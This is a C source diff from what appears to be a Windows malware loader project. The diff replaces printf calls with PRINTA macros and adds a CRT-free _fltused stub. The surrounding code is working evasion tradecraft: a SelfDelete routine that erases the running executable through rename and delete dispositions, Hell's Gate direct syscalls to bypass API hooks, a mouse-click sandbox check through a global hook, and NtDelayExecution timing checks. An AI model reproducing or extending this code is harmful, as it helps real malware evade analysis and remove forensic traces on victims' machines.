@@ -1,5 +1,10 @@
 #include "Common.h"
 
+#ifdef _MSC_VER
+extern int _fltused;
+__declspec(selectany) int _fltused = 1;
+#endif
+
 HHOOK g_hMouseHook = NULL;
 DWORD g_dwMouseClicks = 0;
 
@@ -13,16 +18,16 @@ BOOL SelfDelete() {
 		dwFilePathBufferSize * sizeof(WCHAR)
 	);
 	if (!pFilePathBuffer) {
-		printf("[!] HeapAlloc Failed With Error: 0x%0.8X \n", GetLastError());
+		PRINTA("[!] HeapAlloc Failed With Error: 0x%0.8X \n", GetLastError());
 		return FALSE;
 	}
 
 	// Get the path of the current executable
 	if (!g_Api.pGetModuleFileNameW(NULL, pFilePathBuffer, dwFilePathBufferSize)) {
-		printf("[!] GetModuleFileNameW Failed With Error: 0x%0.8X \n", GetLastError());
+		PRINTA("[!] GetModuleFileNameW Failed With Error: 0x%0.8X \n", GetLastError());
 		return FALSE;
 	}
-	//wprintf(L"[+] FilePath: %ls\n", pFilePathBuffer);
+	//PRINTW(L"[+] FilePath: %ls\n", pFilePathBuffer);
 
 	// Opening a handle to the current file
 	HANDLE hFile = g_Api.pCreateFileW(
@@ -35,7 +40,7 @@ BOOL SelfDelete() {
 		NULL
 	);
 	if (hFile == INVALID_HANDLE_VALUE) {
-		printf("[!] CreateFileW Failed With Error: 0x%0.8X \n", GetLastError());
+		PRINTA("[!] CreateFileW Failed With Error: 0x%0.8X \n", GetLastError());
 		return FALSE;
 	}
 
@@ -51,7 +56,7 @@ BOOL SelfDelete() {
 		sFileRenameInfo
 	);
 	if (!pFileRenameInfo) {
-		printf("[!] HeapAlloc Failed With Error : 0x%0.8X \n", GetLastError());
+		PRINTA("[!] HeapAlloc Failed With Error : 0x%0.8X \n", GetLastError());
 		return FALSE;
 	}
 
@@ -66,14 +71,14 @@ BOOL SelfDelete() {
 		pFileRenameInfo,
 		(DWORD)sFileRenameInfo
 	)) {
-		printf("[!] SetFileInformationByHandle [R] Failed With Error: 0x%0.8X \n", GetLastError());
+		PRINTA("[!] SetFileInformationByHandle [R] Failed With Error: 0x%0.8X \n", GetLastError());
 		return FALSE;
 	}
 
 	// Closing the file handle
 	HellsGate(g_SyscallsTable.NtClose.wSystemCall);
 	if ((status = HellDescent(hFile)) != 0x0) {
-		printf("[!] NtClose Failed With Error : 0x%0.8X \n", status);
+		PRINTA("[!] NtClose Failed With Error : 0x%0.8X \n", status);
 		return FALSE;
 	}
 
@@ -92,7 +97,7 @@ BOOL SelfDelete() {
 			return TRUE;
 		}
 		else {
-			printf("[!] CreateFileW Failed With Error: 0x%0.8X \n", GetLastError());
+			PRINTA("[!] CreateFileW Failed With Error: 0x%0.8X \n", GetLastError());
 			return FALSE;
 		}
 	}
@@ -109,14 +114,14 @@ BOOL SelfDelete() {
 		&fileDispositionInfo,
 		sizeof(fileDispositionInfo)
 	)) {
-		printf("[!] SetFileInformationByHandle [D] Failed With Error : 0x%0.8X \n", GetLastError());
+		PRINTA("[!] SetFileInformationByHandle [D] Failed With Error : 0x%0.8X \n", GetLastError());
 		return FALSE;
 	}
 
 	// Close the handle for deleting the file
 	HellsGate(g_SyscallsTable.NtClose.wSystemCall);
 	if ((status = HellDescent(hFile)) != 0x0) {
-		printf("[!] NtClose Failed With Error : 0x%0.8X \n", status);
+		PRINTA("[!] NtClose Failed With Error : 0x%0.8X \n", status);
 		return FALSE;
 	}
 
@@ -128,7 +133,7 @@ BOOL SelfDelete() {
 
 LRESULT MouseHookCallback(int nCode, WPARAM wParam, LPARAM lParam) {
 	if (wParam == WM_LBUTTONDOWN || wParam == WM_RBUTTONDOWN || wParam == WM_MBUTTONDOWN) {
-		printf("[ # ] Mouse Clicked \n");
+		PRINTA("[ # ] Mouse Clicked \n");
 		g_dwMouseClicks++;
 	}
 
@@ -145,7 +150,7 @@ BOOL InstallMouseHook() {
 		NULL
 	);
 	if (!g_hMouseHook) {
-		printf("[!] SetWindowsHookExW Failed With Error : %d\n", GetLastError());
+		PRINTA("[!] SetWindowsHookExW Failed With Error : %d\n", GetLastError());
 		return FALSE;
 	}
 
@@ -165,7 +170,7 @@ BOOL DelayExec(DWORD dwMilliSeconds) {
 	delay = (LONGLONG)dwMilliSeconds * 10000;
 	delayInterval.QuadPart = -delay;
 
-	printf("[i] Delaying Execution Using \"NtDelayExecution\" For %0.3d Seconds", (dwMilliSeconds / 1000));
+	PRINTA("[i] Delaying Execution Using \"NtDelayExecution\" For %0.3d Seconds", (dwMilliSeconds / 1000));
 
 	DWORD T0 = g_Api.pGetTickCount64();
 
@@ -175,7 +180,7 @@ BOOL DelayExec(DWORD dwMilliSeconds) {
 		&delayInterval
 	);
 	if (status && status != STATUS_TIMEOUT) {
-		printf("[!] NtDelayExecution Failed With Error: 0x%0.8X \n", status);
+		PRINTA("[!] NtDelayExecution Failed With Error: 0x%0.8X \n", status);
 		return FALSE;
 	}
 
@@ -184,8 +189,8 @@ BOOL DelayExec(DWORD dwMilliSeconds) {
 	if ((DWORD)(T1 - T0) < dwMilliSeconds)
 		return FALSE;
 
-	printf("\n\t>> _T1 - _T0 = %d \n", (DWORD)(T1 - T0));
-	printf("[+] DONE \n");
+	PRINTA("\n\t>> _T1 - _T0 = %d \n", (DWORD)(T1 - T0));
+	PRINTA("[+] DONE \n");
 
 	return TRUE;
 }
@@ -205,7 +210,7 @@ BOOL AntiAnalysis(DWORD dwMilliSeconds)
 	}
 
 	while (++i <= 10) {
-		printf("[#] Monitoring Mouse-Clicks For %d Seconds - Need %d Clicks To Pass\n", (dwMilliSeconds / 1000), REQUIRED_CLICKS);
+		PRINTA("[#] Monitoring Mouse-Clicks For %d Seconds - Need %d Clicks To Pass\n", (dwMilliSeconds / 1000), REQUIRED_CLICKS);
 
 		// Creating a thread that runs 'InstallMouseHook' function
 		HellsGate(g_SyscallsTable.NtCreateThreadEx.wSystemCall);
@@ -219,7 +224,7 @@ BOOL AntiAnalysis(DWORD dwMilliSeconds)
 		);
 
 		if (status) {
-			printf("[!] NtCreateThreadEx Failed With Error : 0x%0.8X \n", status);
+			PRINTA("[!] NtCreateThreadEx Failed With Error : 0x%0.8X \n", status);
 			return FALSE;
 		}
 
@@ -234,7 +239,7 @@ BOOL AntiAnalysis(DWORD dwMilliSeconds)
 		);
 
 		if (status && status != STATUS_TIMEOUT) {
-			printf("[!] NtWaitForSingleObject Failed With Error : 0x%0.8X \n", status);
+			PRINTA("[!] NtWaitForSingleObject Failed With Error : 0x%0.8X \n", status);
 			return FALSE;
 		}
 
@@ -242,21 +247,21 @@ BOOL AntiAnalysis(DWORD dwMilliSeconds)
 		status = HellDescent(hThread);
 
 		if (status) {
-			printf("[!] NtClose Failed With Error : 0x%0.8X \n", status);
+			PRINTA("[!] NtClose Failed With Error : 0x%0.8X \n", status);
 			return FALSE;
 		}
 
 		// Unhooking
 		if (g_hMouseHook && g_Api.pUnhookWindowsHookEx(g_hMouseHook) == FALSE) {
-			printf("[!] UnhookWindowsHookEx Failed With Error : %d \n", GetLastError());
+			PRINTA("[!] UnhookWindowsHookEx Failed With Error : %d \n", GetLastError());
 			return FALSE;
 		}
-		printf("[+] DONE!\n");
+		PRINTA("[+] DONE!\n");
 
 
 		// Delaying execution for specific amount of time
 		FLOAT delayTime = i * 10000;
-		if (!DelayExec((DWORD)(delayTime / 2)))
+		if (!DelayExec((DWORD)(delayTime)))
 			return FALSE;
 
 		// If the user clicked more than REQUIRED_CLICKS times, we return true
